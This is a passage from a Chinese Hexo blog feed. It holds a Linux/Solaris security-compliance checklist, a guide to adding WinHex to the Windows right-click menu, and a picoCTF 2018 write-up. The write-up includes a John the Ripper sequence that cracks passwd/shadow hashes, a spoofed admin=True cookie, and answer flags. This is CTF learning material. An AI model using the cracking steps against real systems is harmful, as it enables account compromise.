class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将info或更高级别的消息送到messages，除了mail、authpriv、cron以外。</span></span><br><span class="line"><span class="comment"># 其中*是通配符；none表示不对任何级别的信息进行记录。</span></span><br><span class="line">*.info;mail.none;authpriv.none;cron.none                /var/<span class="built_in">log</span>/messages</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将授权和安全相关的消息记录到secure文件中</span></span><br><span class="line">authpriv.*                                              /var/<span class="built_in">log</span>/secure</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由mail子系统产生的消息记录到maillog中.</span></span><br><span class="line">mail.*                                                  -/var/<span class="built_in">log</span>/maillog</span><br><span class="line"></span><br><span class="line"><span class="comment"># cron守护进程相关的信息记录到cron文件中</span></span><br><span class="line">cron.*                                                  /var/<span class="built_in">log</span>/cron</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最高级别消息发送给所有在线的用户</span></span><br><span class="line">*.emerg                                                 *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网络消息子系统.重要情况</span></span><br><span class="line">uucp,news.crit                                          /var/<span class="built_in">log</span>/spooler</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将和系统启动相关的信息记录到boot.log</span></span><br><span class="line">local7.*                                                /var/<span class="built_in">log</span>/boot.log</span><br></pre></td></tr></table></figure><ul><li><p>日志设施有：</p><blockquote><p>auth(security), authpriv: 授权和安全相关的消息<br>kern: 来自Linux内核的消息<br>mail: 由mail子系统产生的消息<br>cron: cron守护进程相关的信息<br>daemon: 守护进程产生的信息<br>news: 网络消息子系统<br>lpr: 打印相关的日志信息<br>user: 用户进程相关的信息<br>local0 to local7: 保留，本地使用</p></blockquote></li><li><p>日志级别有(升序)：</p><blockquote><p>debug：包含详细的开发情报的信息，通常只在调试一个程序时使用。<br>info：情报信息，正常的系统消息，比如骚扰报告，带宽数据等，不需要处理。<br>notice：不是错误情况，也不需要立即处理。<br>warning：警告信息，不是错误，比如系统磁盘使用了85%等。<br>err：错误，不是非常紧急，在一定时间内修复即可。<br>crit：重要情况，如硬盘错误，备用连接丢失。<br>alert：应该被立即改正的问题，如系统数据库被破坏，ISP连接丢失。<br>emerg：紧急情况，需要立即通知技术人员。</p></blockquote></li></ul><p><a href="https://www.mtyun.com/library/how-to-config-rsyslog" target="_blank" rel="noopener">如何对rsyslog进行配置</a></p><h2 id="入侵防范"><a href="#入侵防范" class="headerlink" title="入侵防范"></a>入侵防范</h2><h3 id="系统服务"><a href="#系统服务" class="headerlink" title="系统服务"></a>系统服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">service --status-all</span><br><span class="line">ps -ef</span><br><span class="line">setup <span class="comment">#通过图形界面记录系统开启的网络服务</span></span><br><span class="line">chkconfig --list <span class="comment">#查看各运行级别下系统开启的服务，命令行为3,5为图形化</span></span><br><span class="line">who –r <span class="comment">#查看系统当前运行级别</span></span><br></pre></td></tr></table></figure><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -lntp <span class="comment">#查看tcp端口</span></span><br><span class="line">netstat -lnup <span class="comment">#查看udp端口</span></span><br><span class="line">netstat -ano  <span class="comment">#早期Linux</span></span><br></pre></td></tr></table></figure><h3 id="地址限制"><a href="#地址限制" class="headerlink" title="地址限制"></a>地址限制</h3><ul><li>/etc/hosts.allow、/etc/hosts.deny</li></ul><figure class="highlight bash"><figcaption><span>参数</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sshd:192.168.1.0/24:allow</span><br><span class="line">sshd:*:deny</span><br></pre></td></tr></table></figure><ul><li>/etc/ssh/sshd_config</li></ul><figure class="highlight bash"><figcaption><span>参数</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowUsers root <span class="built_in">test</span>@192.168.1.1</span><br><span class="line">DenyUsers root <span class="built_in">test</span>@192.168.1.1</span><br></pre></td></tr></table></figure><ul><li>iptables</li></ul><figure class="highlight bash"><figcaption><span>命令</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -n -L</span><br></pre></td></tr></table></figure><h3 id="补丁包"><a href="#补丁包" class="headerlink" title="补丁包"></a>补丁包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa grep patch</span><br></pre></td></tr></table></figure><p>####################</p><h1 id="Solaris"><a href="#Solaris" class="headerlink" title="Solaris"></a>Solaris</h1><h2 id="身份鉴别-1"><a href="#身份鉴别-1" class="headerlink" title="身份鉴别"></a>身份鉴别</h2><h3 id="密码策略-1"><a href="#密码策略-1" class="headerlink" title="密码策略"></a>密码策略</h3><ul><li>/etc/default/passwd</li></ul><figure class="highlight bash"><figcaption><span>参数</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MINWEEKS=1   <span class="comment"># 密码可以被改变的最小时段</span></span><br><span class="line">MAXWEEKS=13  <span class="comment"># 密码最大的生存周期</span></span><br><span class="line">WARNWEEKS=4  <span class="comment"># 设定密码到期提醒天数</span></span><br><span class="line">PASSLENGTH=8 <span class="comment"># 设定密码长度</span></span><br><span class="line">MINALPHA=2   <span class="comment"># 口令必须包含字母的最小数目</span></span><br><span class="line">MINDIFF=1    <span class="comment"># 口令必须包含唯一字符的最小数目</span></span><br></pre></td></tr></table></figure><h3 id="登录失败-1"><a href="#登录失败-1" class="headerlink" title="登录失败"></a>登录失败</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/security/policy.conf</span><br><span class="line">/etc/default/login</span><br><span class="line"></span><br><span class="line">LOCK_AFTER_RETRIES=YES</span><br><span class="line">RETRIES=5</span><br></pre></td></tr></table></figure><h3 id="远程协议"><a href="#远程协议" class="headerlink" title="远程协议"></a>远程协议</h3><figure class="highlight bash"><figcaption><span>Solaris</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">svcs | grep ssh</span><br><span class="line">svcs | grep telnet</span><br></pre></td></tr></table></figure><h2 id="访问控制-1"><a href="#访问控制-1" class="headerlink" title="访问控制"></a>访问控制</h2><h2 id="安全审计-1"><a href="#安全审计-1" class="headerlink" title="安全审计"></a>安全审计</h2><figure class="highlight bash"><figcaption><span>Solaris</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/default/login</span><br><span class="line">SYSLOG=YES <span class="comment">#审计进程运行正常</span></span><br><span class="line"></span><br><span class="line">svcs |grep auditd <span class="comment">#audit服务</span></span><br></pre></td></tr></table></figure><h3 id="审计内容"><a href="#审计内容" class="headerlink" title="审计内容"></a>审计内容</h3><figure class="highlight bash"><figcaption><span>Solaris</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/etc/syslog.conf </span><br><span class="line">*.info;mail.none;news.none;authpriv.none;cron.none /var/<span class="built_in">log</span>/messages</span><br><span class="line"></span><br><span class="line">/etc/security/audit_control</span><br><span class="line"><span class="comment">#应设置需审计的事件类，如：</span></span><br><span class="line"><span class="comment">#audit_control file</span></span><br><span class="line">dir: /var/audit</span><br><span class="line">flags:1o</span><br><span class="line">minfree:20</span><br><span class="line">naflags:lo</span><br><span class="line">*审计事件类型至少应包括：lo、fw、fm、fd。</span><br></pre></td></tr></table></figure><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><figure class="highlight bash"><figcaption><span>RadHat/CentOS</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/<span class="built_in">log</span>/messages</span><br><span class="line">/var/<span class="built_in">log</span>/secure</span><br><span class="line">/var/<span class="built_in">log</span>/audit/audit.log</span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>Solaris</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/adm/messages；</span><br><span class="line">/var/adm/wtmpx；</span><br><span class="line">/var/adm/utmpx；</span><br></pre></td></tr></table></figure><h2 id="入侵防范-1"><a href="#入侵防范-1" class="headerlink" title="入侵防范"></a>入侵防范</h2><h3 id="端口-1"><a href="#端口-1" class="headerlink" title="端口"></a>端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -lntp <span class="comment">#查看tcp端口</span></span><br><span class="line">netstat -lnup <span class="comment">#查看udp端口</span></span><br><span class="line">netstat -ano  <span class="comment">#早期Linux</span></span><br></pre></td></tr></table></figure><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><figure class="highlight bash"><figcaption><span>Solaris</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svcs -a</span><br></pre></td></tr></table></figure><h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><figure class="highlight bash"><figcaption><span>Solaris</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/release <span class="comment">#系统版本、安全补丁安装</span></span><br></pre></td></tr></table></figure><h3 id="地址限制-1"><a href="#地址限制-1" class="headerlink" title="地址限制"></a>地址限制</h3><figure class="highlight bash"><figcaption><span>Solaris</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/default/login</span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line">CONSOLE=/dev/console</span><br></pre></td></tr></table></figure><h1 id="系统资源-2-0无要求"><a href="#系统资源-2-0无要求" class="headerlink" title="系统资源(2.0无要求)"></a><del>系统资源</del>(2.0无要求)</h1><figure class="highlight bash"><figcaption><span>RadHat/CentOS</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件</span></span><br><span class="line">/etc/security/limits.conf</span><br><span class="line"><span class="comment"># 1、fsize 用户创建的文件大小限制；</span></span><br><span class="line"><span class="comment"># 2、core 生成的core文件大小的限制；</span></span><br><span class="line"><span class="comment"># 3、cpu 用户进程可用cpu的限定值；</span></span><br><span class="line"><span class="comment"># 4、data 进程数据段大小的限定值；</span></span><br><span class="line"><span class="comment"># 5、stack 进程堆栈短大小的限定值；</span></span><br><span class="line"><span class="comment"># 6、rss 进程常驻内存段的限定值；</span></span><br><span class="line"><span class="comment"># 7、nofiles 进程中打开文件的最大数量。</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>Solaris</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -a</span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line">time(seconds)</span><br><span class="line">file(blocks)</span><br><span class="line">data(kbytes)</span><br><span class="line">stack(kbytes)</span><br><span class="line">memory(kbytes)</span><br><span class="line">coredump(blocks)</span><br><span class="line">nofiles(descriptors)</span><br></pre></td></tr></table></figure><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> 等级保护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>设置文件右键快捷菜单</title>
      <link href="/2018/10/13/%E8%AE%BE%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8F%B3%E9%94%AE%E5%BF%AB%E6%8D%B7%E8%8F%9C%E5%8D%95/"/>
      <url>/2018/10/13/%E8%AE%BE%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8F%B3%E9%94%AE%E5%BF%AB%E6%8D%B7%E8%8F%9C%E5%8D%95/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>经常用到WinHex，但是每次需要打开winhex然后再打开文件过于繁琐，于是研究了添加右键快捷菜单设置方法</p></blockquote><a id="more"></a><h1 id="文件右键快捷菜单设置"><a href="#文件右键快捷菜单设置" class="headerlink" title="文件右键快捷菜单设置"></a>文件右键快捷菜单设置</h1><ol><li><code>Win+R</code> 输入 <code>regedit</code> 打开运行注册表,找到 <code>计算机\HKEY_CLASSES_ROOT\*\shell</code>项，右键新建项，名称<code>WinHex</code>(可随意)<figure class="image-box">                <img src="https://bp.yuanlichenai.cn/RightClick/2018-10-13-13-48-05.jpg" alt="右键新建项" title="" class="">                <p>右键新建项</p>            </figure></li><li>右键<code>WinHex</code>项，新建字符串值<code>Icon</code>，数据为<code>WinHex.exe</code>的文件路径，如下图<figure class="image-box">                <img src="https://bp.yuanlichenai.cn/RightClick/2018-10-13-13-49-48.jpg" alt="新建字符串值" title="" class="">                <p>新建字符串值</p>            </figure></li><li>右键<code>WinHex</code>项，新建<code>Command</code>项，在右侧窗口的“默认”键值栏内输入程序所在的路径 如：<code>E:\学习\Tools\WinHex\WinHex.exe %1</code> 其中的%1表示要打开的文件参数。<figure class="image-box">                <img src="https://bp.yuanlichenai.cn/RightClick/2018-10-13-13-57-47.png" alt="设置Command值" title="" class="">                <p>设置Command值</p>            </figure></li><li>设置完成即可生效。<figure class="image-box">                <img src="https://bp.yuanlichenai.cn/RightClick/2018-10-13-14-00-39.png" alt="效果图" title="" class="">                <p>效果图</p>            </figure></li></ol><h1 id="文件夹右键快捷菜单设置"><a href="#文件夹右键快捷菜单设置" class="headerlink" title="文件夹右键快捷菜单设置"></a>文件夹右键快捷菜单设置</h1><p>设置方法与<a href="/https://bp.yuanlichenai.cn/RightClick/2018/10/13/Notes/Right-click/#文件右键快捷菜单设置">文件右键快捷菜单</a>相同，路径：<code>计算机\HKEY_CLASSES_ROOT\Directory\shell\git_shell</code><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/RightClick/2018-10-13-14-05-58.png" alt="路径" title="" class="">                <p>路径</p>            </figure></p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> System </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 注册表 </tag>
            
            <tag> 右键菜单 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018 Picoctf</title>
      <link href="/2018/09/30/2018picoctf/"/>
      <url>/2018/09/30/2018picoctf/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>国外的CTF比赛，前面很简单，感觉很适合入门，地址：<a href="https://2018game.picoctf.com/" target="_blank" rel="noopener">https://2018game.picoctf.com/</a></p></blockquote><a id="more"></a><h1 id="Forensics-Warmup-1"><a href="#Forensics-Warmup-1" class="headerlink" title="Forensics Warmup 1"></a>Forensics Warmup 1</h1><p>压缩包解开就有<br><!--picoCTF{welcome_to_forensics}--></p><h1 id="Forensics-Warmup-2"><a href="#Forensics-Warmup-2" class="headerlink" title="Forensics Warmup 2"></a>Forensics Warmup 2</h1><p>反正我能直接打开emmm<br><!--picoCTF{extensions_are_a_lie}--></p><h1 id="General-Warmup-1"><a href="#General-Warmup-1" class="headerlink" title="General Warmup 1"></a>General Warmup 1</h1><p>进制转换，略…<br><!--picoCTF{A}--></p><h1 id="General-Warmup-2"><a href="#General-Warmup-2" class="headerlink" title="General Warmup 2"></a>General Warmup 2</h1><p>进制转换，略…<br><!--picoCTF{11011}--></p><h1 id="General-Warmup-3"><a href="#General-Warmup-3" class="headerlink" title="General Warmup 3"></a>General Warmup 3</h1><p>进制转换，略…<br><!--picoCTF{61}--></p><h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p>视频下面有flag<br><!-- picoCTF{xiexie_ni_lai_zheli}--></p><h1 id="Reversing-Warmup-1"><a href="#Reversing-Warmup-1" class="headerlink" title="Reversing Warmup 1"></a>Reversing Warmup 1</h1><p>编辑器打开查找flag<br><!--picoCTF{welc0m3_t0_r3VeRs1nG}--></p><h1 id="Reversing-Warmup-2"><a href="#Reversing-Warmup-2" class="headerlink" title="Reversing Warmup 2"></a>Reversing Warmup 2</h1><p>base64<br><!--picoCTF{th4t_w4s_s1mpL3}--></p><h1 id="Crypto-Warmup-1"><a href="#Crypto-Warmup-1" class="headerlink" title="Crypto Warmup 1"></a>Crypto Warmup 1</h1><p><a href="http://ctf.ssleye.com/vigenere.html" target="_blank" rel="noopener">维吉尼亚密码</a><br><!--picoCTF{SECRETMESSAGE}--></p><h1 id="Crypto-Warmup-2"><a href="#Crypto-Warmup-2" class="headerlink" title="Crypto Warmup 2"></a>Crypto Warmup 2</h1><p><a href="http://ctf.ssleye.com/rot13.html" target="_blank" rel="noopener">rot13密码</a><br><!--picoCTF{this_is_crypto!}--></p><h1 id="grep-1"><a href="#grep-1" class="headerlink" title="grep 1"></a>grep 1</h1><p>一样用编辑器打开找flag<br><!--picoCTF{grep_and_you_will_find_c709fa94}--></p><h1 id="net-cat"><a href="#net-cat" class="headerlink" title="net cat"></a>net cat</h1><p>nc一下喽<br><!--picoCTF{NEtcat_iS_a_NEcESSiTy_c97963fe}--></p><h1 id="HEEEEEEERE’S-Johnny"><a href="#HEEEEEEERE’S-Johnny" class="headerlink" title="HEEEEEEERE’S Johnny!"></a>HEEEEEEERE’S Johnny!</h1><p>通过passwd和shadow爆破密码，使用kali破解<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># unshadow passwd shadow &gt; flag_passwd</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># john --wordlist=/usr/share/john/password.lst flag_passwd</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># john --show flag_passwd</span></span><br></pre></td></tr></table></figure></p><p>参考：<a href="http://topspeedsnail.com/John-the-Ripper-learn/" target="_blank" rel="noopener">Kali Linux：使用John the Ripper破解密码</a><br><!--picoCTF{J0hn_1$_R1pp3d_289677b5}--></p><h1 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h1><p>strings一下，编辑器打开也找得到<br><!--picoCTF{sTrIngS_sAVeS_Time_d7c8de6c}--></p><h1 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h1><figure class="highlight plain"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 2018shell2.picoctf.com 44310 &gt;&gt;1.txt</span><br></pre></td></tr></table></figure><p>使用telnet也行，如果使用ssh会得到一个错误答案2333。<br><!--picoCTF{almost_like_mario_a13e5b27}--></p><h1 id="Inspect-Me"><a href="#Inspect-Me" class="headerlink" title="Inspect Me"></a>Inspect Me</h1><p>留意页面提示，flag分别在index、js和css里<br><!--picoCTF{ur_4_real_1nspect0r_g4dget_b4887011}--></p><h1 id="grep-2"><a href="#grep-2" class="headerlink" title="grep 2"></a>grep 2</h1><figure class="highlight bash"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /problems/grep-2_4_06c2058761f24267033e7ca6ff9d9144/files/.|xargs grep <span class="string">"picoCTF"</span></span><br></pre></td></tr></table></figure><!--picoCTF{grep_r_and_you_will_find_036bbb25}--><h1 id="Aca-Shell-A"><a href="#Aca-Shell-A" class="headerlink" title="Aca-Shell-A"></a>Aca-Shell-A</h1><p>失败了n次，总算过了。。。<br><figure class="highlight bash"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> secret</span><br><span class="line">ls</span><br><span class="line">rm intel*</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Drop it in!'</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span> executables</span><br><span class="line">ls</span><br><span class="line">./dontLookHere</span><br><span class="line">whoami</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">cp /tmp/TopSecret passwords</span><br><span class="line"><span class="built_in">cd</span> passwords</span><br><span class="line">cat TopSecret</span><br></pre></td></tr></table></figure></p><!--picoCTF{CrUsHeD_It_d6f202f1}--><h1 id="Client-Side-is-Still-Bad"><a href="#Client-Side-is-Still-Bad" class="headerlink" title="Client Side is Still Bad"></a>Client Side is Still Bad</h1><figure class="highlight js"><figcaption><span>源码js部分</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   checkpass = <span class="built_in">document</span>.getElementById(<span class="string">"pass"</span>).value;</span><br><span class="line">   split = <span class="number">4</span>;</span><br><span class="line">   <span class="keyword">if</span> (checkpass.substring(split*<span class="number">7</span>, split*<span class="number">8</span>) == <span class="string">'&#125;'</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span> (checkpass.substring(split*<span class="number">6</span>, split*<span class="number">7</span>) == <span class="string">'17e9'</span>) &#123;</span><br><span class="line">       <span class="keyword">if</span> (checkpass.substring(split*<span class="number">5</span>, split*<span class="number">6</span>) == <span class="string">'d_91'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (checkpass.substring(split*<span class="number">4</span>, split*<span class="number">5</span>) == <span class="string">'s_ba'</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (checkpass.substring(split*<span class="number">3</span>, split*<span class="number">4</span>) == <span class="string">'nt_i'</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (checkpass.substring(split*<span class="number">2</span>, split*<span class="number">3</span>) == <span class="string">'clie'</span>) &#123;</span><br><span class="line">             <span class="keyword">if</span> (checkpass.substring(split, split*<span class="number">2</span>) == <span class="string">'CTF&#123;'</span>) &#123;</span><br><span class="line">               <span class="keyword">if</span> (checkpass.substring(<span class="number">0</span>,split) == <span class="string">'pico'</span>) &#123;</span><br><span class="line">                 alert(<span class="string">"You got the flag!"</span>)</span><br><span class="line">                 &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             &#125;</span><br><span class="line">     </span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">     alert(<span class="string">"Incorrect password"</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><!--picoCTF{client_is_bad_9117e9}--><h1 id="Desrouleaux"><a href="#Desrouleaux" class="headerlink" title="Desrouleaux"></a>Desrouleaux</h1><p>最后一个问题没看懂，参考：<a href="https://medium.com/@anglee19/forensics-question-desrouleaux-solved-2a8b692d2425" target="_blank" rel="noopener">https://medium.com/@anglee19/forensics-question-desrouleaux-solved-2a8b692d2425</a><br><!--picoCTF{J4y_s0n_d3rUUUULo_a062e5f8}--></p><h1 id="Logon"><a href="#Logon" class="headerlink" title="Logon"></a>Logon</h1><p>打开代理，将<code>admin=False</code>改成<code>admin=True</code><br><!--picoCTF{l0g1ns_ar3nt_r34l_2a968c11}--></p><h1 id="Reading-Between-the-Eyes"><a href="#Reading-Between-the-Eyes" class="headerlink" title="Reading Between the Eyes"></a>Reading Between the Eyes</h1><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/CTF-Game/2018picoctf/2018-10-07-20-53-24.png" alt="" title="" class="">                <p></p>            </figure><!--picoCTF{r34d1ng_b37w33n_7h3_by73s}--><h1 id="Recovering-From-the-Snap"><a href="#Recovering-From-the-Snap" class="headerlink" title="Recovering From the Snap"></a>Recovering From the Snap</h1><p>用WinHex打开，可以看到在00009A00处有jpg的文件头，将前面的数据删除。<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/CTF-Game/2018picoctf/2018-10-15-22-06-12.png" alt="" title="" class="">                <p></p>            </figure><br>用bingwalk扫描发现多张图片，用foremost分离出来，flag在最后一张图里。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># binwalk animals.dd </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">632832        0x9A800         JPEG image data, JFIF standard 1.01</span><br><span class="line">1126400       0x113000        JPEG image data, JFIF standard 1.01</span><br><span class="line">1517568       0x172800        JPEG image data, JFIF standard 1.01</span><br><span class="line">1773568       0x1B1000        JPEG image data, JFIF standard 1.01</span><br><span class="line">1773598       0x1B101E        TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">2097152       0x200000        JPEG image data, JFIF standard 1.01</span><br><span class="line">2097182       0x20001E        TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">2568192       0x273000        JPEG image data, JFIF standard 1.01</span><br><span class="line">2568222       0x27301E        TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">2961408       0x2D3000        JPEG image data, JFIF standard 1.01</span><br><span class="line">2961438       0x2D301E        TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line"></span><br><span class="line">root@kali:~/Desktop<span class="comment"># foremost animals.dd </span></span><br><span class="line">Processing: animals.dd</span><br><span class="line">|*|</span><br><span class="line">root@kali:~/Desktop<span class="comment">#</span></span><br></pre></td></tr></table></figure></p><!--picoCTF{th3_5n4p_happ3n3d}--><h1 id="admin-panel"><a href="#admin-panel" class="headerlink" title="admin panel"></a>admin panel</h1><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/CTF-Game/2018picoctf/2018-10-07-21-02-14.png" alt="查找分组字节流" title="" class="">                <p>查找分组字节流</p>            </figure><!--picoCTF{n0ts3cur3_df598569}--><h1 id="Mr-Robots"><a href="#Mr-Robots" class="headerlink" title="Mr. Robots"></a>Mr. Robots</h1><p>访问robots.txt文件<br><!--picoCTF{th3_w0rld_1s_4_danger0us_pl4c3_3lli0t_30de1}--></p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF比赛 </tag>
            
